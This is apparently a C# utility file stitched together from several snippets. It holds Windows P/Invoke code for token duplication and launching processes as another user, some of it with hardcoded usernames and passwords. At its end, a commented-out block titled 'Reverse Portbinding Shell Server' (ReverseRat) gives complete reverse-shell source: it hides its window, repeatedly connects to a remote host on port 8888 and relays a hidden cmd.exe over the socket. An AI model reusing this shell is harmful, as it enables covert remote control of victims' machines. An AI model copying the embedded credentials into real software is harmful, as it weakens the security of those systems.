            public enum SECURITY_IMPERSONATION_LEVEL
            {
                SecurityAnonymous,
                SecurityIdentification,
                SecurityImpersonation,
                SecurityDelegation
            }
            public enum TOKEN_INFORMATION_CLASS
            {
                /// <summary>
                /// The buffer receives a TOKEN_USER structure that contains the user account of the token.
                /// </summary>
                TokenUser = 1,

                /// <summary>
                /// The buffer receives a TOKEN_GROUPS structure that contains the group accounts associated with the token.
                /// </summary>
                TokenGroups,

                /// <summary>
                /// The buffer receives a TOKEN_PRIVILEGES structure that contains the privileges of the token.
                /// </summary>
                TokenPrivileges,

                /// <summary>
                /// The buffer receives a TOKEN_OWNER structure that contains the default owner security identifier (SID) for newly created objects.
                /// </summary>
                TokenOwner,

                /// <summary>
                /// The buffer receives a TOKEN_PRIMARY_GROUP structure that contains the default primary group SID for newly created objects.
                /// </summary>
                TokenPrimaryGroup,

                /// <summary>
                /// The buffer receives a TOKEN_DEFAULT_DACL structure that contains the default DACL for newly created objects.
                /// </summary>
                TokenDefaultDacl,

                /// <summary>
                /// The buffer receives a TOKEN_SOURCE structure that contains the source of the token. TOKEN_QUERY_SOURCE access is needed to retrieve this information.
                /// </summary>
                TokenSource,

                /// <summary>
                /// The buffer receives a TOKEN_TYPE value that indicates whether the token is a primary or impersonation token.
                /// </summary>
                TokenType,

                /// <summary>
                /// The buffer receives a SECURITY_IMPERSONATION_LEVEL value that indicates the impersonation level of the token. If the access token is not an impersonation token, the function fails.
                /// </summary>
                TokenImpersonationLevel,

                /// <summary>
                /// The buffer receives a TOKEN_STATISTICS structure that contains various token statistics.
                /// </summary>
                TokenStatistics,

                /// <summary>
                /// The buffer receives a TOKEN_GROUPS structure that contains the list of restricting SIDs in a restricted token.
                /// </summary>
                TokenRestrictedSids,

                /// <summary>
                /// The buffer receives a DWORD value that indicates the Terminal Services session identifier that is associated with the token.
                /// </summary>
                TokenSessionId,

                /// <summary>
                /// The buffer receives a TOKEN_GROUPS_AND_PRIVILEGES structure that contains the user SID, the group accounts, the restricted SIDs, and the authentication ID associated with the token.
                /// </summary>
                TokenGroupsAndPrivileges,

                /// <summary>
                /// Reserved.
                /// </summary>
                TokenSessionReference,

                /// <summary>
                /// The buffer receives a DWORD value that is nonzero if the token includes the SANDBOX_INERT flag.
                /// </summary>
                TokenSandBoxInert,

                /// <summary>
                /// Reserved.
                /// </summary>
                TokenAuditPolicy,

                /// <summary>
                /// The buffer receives a TOKEN_ORIGIN value.
                /// </summary>
                TokenOrigin,

                /// <summary>
                /// The buffer receives a TOKEN_ELEVATION_TYPE value that specifies the elevation level of the token.
                /// </summary>
                TokenElevationType,

                /// <summary>
                /// The buffer receives a TOKEN_LINKED_TOKEN structure that contains a handle to another token that is linked to this token.
                /// </summary>
                TokenLinkedToken,

                /// <summary>
                /// The buffer receives a TOKEN_ELEVATION structure that specifies whether the token is elevated.
                /// </summary>
                TokenElevation,

                /// <summary>
                /// The buffer receives a DWORD value that is nonzero if the token has ever been filtered.
                /// </summary>
                TokenHasRestrictions,

                /// <summary>
                /// The buffer receives a TOKEN_ACCESS_INFORMATION structure that specifies security information contained in the token.
                /// </summary>
                TokenAccessInformation,

                /// <summary>
                /// The buffer receives a DWORD value that is nonzero if virtualization is allowed for the token.
                /// </summary>
                TokenVirtualizationAllowed,

                /// <summary>
                /// The buffer receives a DWORD value that is nonzero if virtualization is enabled for the token.
                /// </summary>
                TokenVirtualizationEnabled,

                /// <summary>
                /// The buffer receives a TOKEN_MANDATORY_LABEL structure that specifies the token's integrity level.
                /// </summary>
                TokenIntegrityLevel,

                /// <summary>
                /// The buffer receives a DWORD value that is nonzero if the token has the UIAccess flag set.
                /// </summary>
                TokenUIAccess,

                /// <summary>
                /// The buffer receives a TOKEN_MANDATORY_POLICY structure that specifies the token's mandatory integrity policy.
                /// </summary>
                TokenMandatoryPolicy,

                /// <summary>
                /// The buffer receives the token's logon security identifier (SID).
                /// </summary>
                TokenLogonSid,

                /// <summary>
                /// The maximum value for this enumeration
                /// </summary>
                MaxTokenInfoClass
            }

            public enum TOKEN_TYPE
            {
                TokenPrimary = 1,
                TokenImpersonation
            }

            public const int GENERIC_ALL_ACCESS = 0x10000000;
            public const int CREATE_NO_WINDOW = 0x08000000;

            [
               DllImport( "kernel32.dll",
                  EntryPoint = "CloseHandle", SetLastError = true,
                  CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall )
            ]
            public static extern bool CloseHandle(IntPtr handle);

            [DllImport( "advapi32.dll", SetLastError = true )]
            static extern Boolean SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,
                ref UInt32 TokenInformation, UInt32 TokenInformationLength);
            [
               DllImport( "advapi32.dll",
                  EntryPoint = "CreateProcessAsUser", SetLastError = true,
                  CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall )
            ]
            public static extern bool
               CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine,
                                   ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes,
                                   bool bInheritHandle, Int32 dwCreationFlags, IntPtr lpEnvrionment,
                                   string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
                                   ref PROCESS_INFORMATION lpProcessInformation);

            [
               DllImport( "advapi32.dll",
                  EntryPoint = "DuplicateTokenEx" )
            ]
            public static extern bool
               DuplicateTokenEx(IntPtr hExistingToken, Int32 dwDesiredAccess,
                                ref SECURITY_ATTRIBUTES lpThreadAttributes,
                                Int32 ImpersonationLevel, Int32 dwTokenType,
                                ref IntPtr phNewToken);

            //**********************************************************************
            public static Process CreateProcessAsUser(string filename, string args)
            {
                var hToken = WindowsIdentity.GetCurrent().Token;
                var hDupedToken = IntPtr.Zero;

                var pi = new PROCESS_INFORMATION();
                var sa = new SECURITY_ATTRIBUTES();
                sa.Length = Marshal.SizeOf( sa );

                try
                {
                    if( !DuplicateTokenEx(
                            hToken,
                            GENERIC_ALL_ACCESS,
                            ref sa,
                            ( int )SECURITY_IMPERSONATION_LEVEL.SecurityIdentification,
                            ( int )TOKEN_TYPE.TokenPrimary,
                            ref hDupedToken
                        ) )
                        throw new Win32Exception( Marshal.GetLastWin32Error() );

                    var si = new STARTUPINFO();
                    si.cb = Marshal.SizeOf( si );
                    si.lpDesktop = String.Empty;

                    si.dwFlags = STARTF_USESHOWWINDOW;
                    si.wShowWindow = SW_HIDE;

                    var path = Path.GetFullPath( filename );
                    var dir = Path.GetDirectoryName( path );

                    // Revert to self to create the entire process; not doing this might
                    // require that the currently impersonated user has "Replace a process
                    // level token" rights - we only want our service account to need
                    // that right.
                    using( var ctx = WindowsIdentity.Impersonate( IntPtr.Zero ) )
                    {
                        UInt32 dwSessionId = 1;  // set it to session 0
                        SetTokenInformation( hDupedToken, TOKEN_INFORMATION_CLASS.TokenSessionId,
                            ref dwSessionId, ( UInt32 )IntPtr.Size );
                        if( !CreateProcessAsUser(
                                                hDupedToken,
                                                path,
                                                string.Format( "\"{0}\" {1}", filename.Replace( "\"", "\"\"" ), args ),
                                                ref sa, ref sa,
                                                false, 0, IntPtr.Zero,
                                                dir, ref si, ref pi
                                        ) )
                            throw new Win32Exception( Marshal.GetLastWin32Error() );
                    }

                    return Process.GetProcessById( pi.dwProcessID );
                }
                finally
                {
                    if( pi.hProcess != IntPtr.Zero )
                        CloseHandle( pi.hProcess );
                    if( pi.hThread != IntPtr.Zero )
                        CloseHandle( pi.hThread );
                    if( hDupedToken != IntPtr.Zero )
                        CloseHandle( hDupedToken );
                }
            } //CreateParams process
#if zero
            [DllImport( "advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode )]
            public static extern bool CreateProcessWithLogonW(
               String userName,
               String domain,
               String password,
               LogonFlags logonFlags,
               String applicationName,
               String commandLine,
               CreationFlags creationFlags,
               UInt32 environment,
               String currentDirectory,
               ref  StartupInfo startupInfo,
               out ProcessInformation processInformation);

            void migrateProcess()
            {
                var startupInfo = new STARTUPINFO()
                {
                    lpDesktop = "WinSta0\\Default",
                    cb = Marshal.SizeOf( typeof( STARTUPINFO ) ),
                };
                var processInfo = new PROCESS_INFORMATION();
                string command = @"c:\windows\Notepad.exe";
                string user = "Administrator";
                string password = "password";
                string currentDirectory = System.IO.Directory.GetCurrentDirectory();
                try
                {
                    bool bRes = CreateProcessWithLogonW( user, null, password, 0,
                        command, command, 0,
                        Convert.ToUInt32( 0 ),
                        currentDirectory, ref startupInfo, out processInfo );
                    if( !bRes )
                    {
                        throw new Win32Exception( Marshal.GetLastWin32Error() );
                    }
                }
                catch( Exception ex )
                {
                    writeToEventLog( ex );
                    return;
                }
                WaitForSingleObject( processInfo.hProcess, Convert.ToUInt32( 0xFFFFFFF ) );
                UInt32 exitCode = Convert.ToUInt32( 123456 );
                GetExitCodeProcess( processInfo.hProcess, ref exitCode );
                writeToEventLog( "Notepad has been started by WatchdogService. Exitcode: " + exitCode );

                CloseHandle( processInfo.hProcess );
                CloseHandle( processInfo.hThread );
            }
         
#endif
        } // class Native Methods?



        //Chris Hand cj_hand@hotmail.com
        //2005.03.13
        class Class1
        {
            public const UInt32 Infinite = 0xffffffff;
            public const Int32      Startf_UseStdHandles = 0x00000100;
            public const Int32      StdOutputHandle = -11;
            public const Int32      StdErrorHandle = -12;

            [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
            public struct StartupInfo
            {
                public int    cb;
                public String reserved;
                public String desktop;
                public String title;
                public int    x;
                public int    y;
                public int    xSize;
                public int    ySize;
                public int    xCountChars;
                public int    yCountChars;
                public int    fillAttribute;
                public int    flags;
                public UInt16 showWindow;
                public UInt16 reserved2;
                public byte   reserved3;
                public IntPtr stdInput;
                public IntPtr stdOutput;
                public IntPtr stdError;
            }

            internal struct ProcessInformation
            {
                public IntPtr process;
                public IntPtr thread;
                public int    processId;
                public int    threadId;
            }


            [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
            public static extern bool CreateProcessWithLogonW(
                String userName,
                String domain,
                String password,
                UInt32 logonFlags,
                String applicationName,
                String commandLine,
                UInt32 creationFlags,
                UInt32 environment,
                String currentDirectory,
                ref   StartupInfo startupInfo,
                out  ProcessInformation processInformation);

            [DllImport("kernel32.dll", SetLastError=true)]
            public static extern bool GetExitCodeProcess(IntPtr process, ref UInt32 exitCode);

            [DllImport("Kernel32.dll", SetLastError=true)]
            public static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);

            [DllImport("Kernel32.dll", SetLastError=true)]
            public static extern IntPtr GetStdHandle(IntPtr handle);

            [DllImport("Kernel32.dll", SetLastError=true)]
            public static extern bool CloseHandle(IntPtr handle);

            [STAThread]
            public static void createUserProcess(string filename)
            {
                StartupInfo startupInfo = new StartupInfo();
                startupInfo.reserved = null;
                startupInfo.flags &= Startf_UseStdHandles;
                startupInfo.stdOutput = (IntPtr)StdOutputHandle;
                startupInfo.stdError = (IntPtr)StdErrorHandle;

                UInt32 exitCode = 123456;
                ProcessInformation processInfo = new ProcessInformation();

                String command = filename;
                String user    = "shmuel";
                String domain  = System.Environment.MachineName;
                String password = "bendor151";
                String currentDirectory = System.IO.Directory.GetCurrentDirectory();

                try
                {
                    CreateProcessWithLogonW(
                        user,
                        domain,
                        password,
                        (UInt32) 1,
                        command,
                        command,
                        (UInt32) 0,
                        (UInt32) 0,
                        currentDirectory,
                        ref startupInfo,
                        out processInfo);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }

                Console.WriteLine("Running ...");
                WaitForSingleObject(processInfo.process, Infinite);
                GetExitCodeProcess(processInfo.process, ref exitCode);

                Console.WriteLine("Exit code: {0}", exitCode);

                CloseHandle(processInfo.process);
                CloseHandle(processInfo.thread);
            }
        } // endclass 1
#if zero
    /// <summary>
    /// Utility class for working with command-line programs.
    /// </summary>
    public class Subprocess {  
        private Subprocess() { }

        /// <summary>
        /// Executes a command-line program, specifying a maximum time to wait
        /// for it to complete.
        /// </summary>
        /// <param name="command">
        /// The path to the program executable.
        /// </param>
        /// <param name="args">
        /// The command-line arguments for the program.
        /// </param>
        /// <param name="timeout">
        /// The maximum time to wait for the subprocess to complete, in milliseconds.
        /// </param>
        /// <returns>
        /// A <see cref="SubprocessResult"/> containing the results of
        /// running the program.
        /// </returns>
        public static SubprocessResult RunProgram(string command, string args, int timeout) {
            bool timedOut = false;
            ProcessStartInfo pinfo = new ProcessStartInfo(command);
            pinfo.Arguments = args;
            pinfo.UseShellExecute = false;
            pinfo.CreateNoWindow = true;
            //pinfo.WorkingDirectory = ?
            pinfo.RedirectStandardOutput = true;
            pinfo.RedirectStandardError = true;
            Process subprocess = Process.Start(pinfo);

            ProcessStream processStream = new ProcessStream();
            try {
                processStream.Read(subprocess);

                subprocess.WaitForExit(timeout);
                processStream.Stop();
                if(!subprocess.HasExited) {
                    // OK, we waited until the timeout but it still didn't exit; just kill the process now
                    timedOut = true;
                    try {
                        subprocess.Kill();
                        processStream.Stop();
                    } catch { }
                    subprocess.WaitForExit();
                }
            } catch(Exception ex) {
                subprocess.Kill();
                processStream.Stop();
                throw ex;
            } finally {
                processStream.Stop();
            }

            TimeSpan duration = subprocess.ExitTime - subprocess.StartTime;
            float executionTime = (float) duration.TotalSeconds;
            SubprocessResult result = new SubprocessResult(
                executionTime, 
                processStream.StandardOutput.Trim(), 
                processStream.StandardError.Trim(), 
                subprocess.ExitCode, 
                timedOut);
            return result;
        }
    }

    /// <summary>
    /// Represents the result of executing a command-line program.
    /// </summary>
    public class SubprocessResult {
        readonly float executionTime;
        readonly string stdout;
        readonly string stderr;
        readonly int exitCode;
        readonly bool timedOut;

        internal SubprocessResult(float executionTime, string stdout, string stderr, int exitCode, bool timedOut) {
            this.executionTime = executionTime;
            this.stdout = stdout;
            this.stderr = stderr;
            this.exitCode = exitCode;
            this.timedOut = timedOut;
        }

        /// <summary>
        /// Gets the total wall time that the subprocess took, in seconds.
        /// </summary>
        public float ExecutionTime {
            get { return executionTime; }
        }

        /// <summary>
        /// Gets the output that the subprocess wrote to its standard output stream.
        /// </summary>
        public string Stdout {
            get { return stdout; }
        }

        /// <summary>
        /// Gets the output that the subprocess wrote to its standard error stream.
        /// </summary>
        public string Stderr {
            get { return stderr; }
        }

        /// <summary>
        /// Gets the subprocess's exit code.
        /// </summary>
        public int ExitCode {
            get { return exitCode; }
        }

        /// <summary>
        /// Gets a flag indicating whether the subprocess was aborted because it
        /// timed out.
        /// </summary>
        public bool TimedOut {
            get { return timedOut; }
        }
    }

    internal class ProcessStream {
        /*
         * Class to get process stdout/stderr streams
         * Author: SeemabK (seemabk@yahoo.com)
         * Usage:
            //create ProcessStream
            ProcessStream myProcessStream = new ProcessStream();
            //create and populate Process as needed
            Process myProcess = new Process();
            myProcess.StartInfo.FileName = "myexec.exe";
            myProcess.StartInfo.Arguments = "-myargs";

            //redirect stdout and/or stderr
            myProcess.StartInfo.UseShellExecute = false;
            myProcess.StartInfo.RedirectStandardOutput = true;
            myProcess.StartInfo.RedirectStandardError = true;

            //start Process
            myProcess.Start();
            //connect to ProcessStream
            myProcessStream.Read(ref myProcess);
            //wait for Process to end
            myProcess.WaitForExit();

            //get the captured output :)
            string output = myProcessStream.StandardOutput;
            string error = myProcessStream.StandardError;
         */
        private Thread StandardOutputReader;
        private Thread StandardErrorReader;
        private Process RunProcess;
        private string _StandardOutput = "";
        private string _StandardError = "";

        public string StandardOutput {
            get { return _StandardOutput; }
        }
        public string StandardError {
            get { return _StandardError; }
        }

        public ProcessStream() {
            Init();
        }

        public void Read(Process process) {
            try {
                Init();
                RunProcess = process;

                if(RunProcess.StartInfo.RedirectStandardOutput) {
                    StandardOutputReader = new Thread(new ThreadStart(ReadStandardOutput));
                    StandardOutputReader.Start();
                }
                if(RunProcess.StartInfo.RedirectStandardError) {
                    StandardErrorReader = new Thread(new ThreadStart(ReadStandardError));
                    StandardErrorReader.Start();
                }

                int TIMEOUT = 1 * 60 * 1000; // one minute
                if(StandardOutputReader != null)
                    StandardOutputReader.Join(TIMEOUT);
                if(StandardErrorReader != null)
                    StandardErrorReader.Join(TIMEOUT);

            } catch { }
        }

        private void ReadStandardOutput() {
            if(RunProcess == null) return;
            try {
                StringBuilder sb = new StringBuilder();
                string line = null;
                while((line = RunProcess.StandardOutput.ReadLine()) != null) {
                    sb.Append(line);
                    sb.Append(Environment.NewLine);
                }
                _StandardOutput = sb.ToString();
            } catch { }
        }

        private void ReadStandardError() {
            if(RunProcess == null) return;
            try {
                StringBuilder sb = new StringBuilder();
                string line = null;
                while((line = RunProcess.StandardError.ReadLine()) != null) {
                    sb.Append(line);
                    sb.Append(Environment.NewLine);
                }
                _StandardError = sb.ToString();
            } catch { }
        }

        private void Init() {
            _StandardError = "";
            _StandardOutput = "";
            RunProcess = null;
            Stop();
        }

        public void Stop() {
            try { if(StandardOutputReader != null) StandardOutputReader.Abort(); } catch { }
            try { if(StandardErrorReader != null) StandardErrorReader.Abort(); } catch { }
            StandardOutputReader = null;
            StandardErrorReader = null;
        }
    }
}
#endif





















    } // endclass
} // end namespace
/*
//
// Reverse Portbinding Shell Server - by Paul Chin
// Aug 26, 2007
//
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;            //for Streams
using System.Diagnostics;   //for Process

namespace ReverseRat
{
    public partial class Form1 : Form
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            for (;;)
            {
                RunServer();
                System.Threading.Thread.Sleep(5000); //Wait 5 seconds
            }                                        //then try again
        }

        private void RunServer()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();
            if (!tcpClient.Connected)
            {
                try
                {                   
                    tcpClient.Connect("177.0.0.1", 8888);
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception err) { return; } //if no Client don't continue

                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                }
            }
            
        }

        private void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception err) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }

        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }

            }
        }
    }
}
*/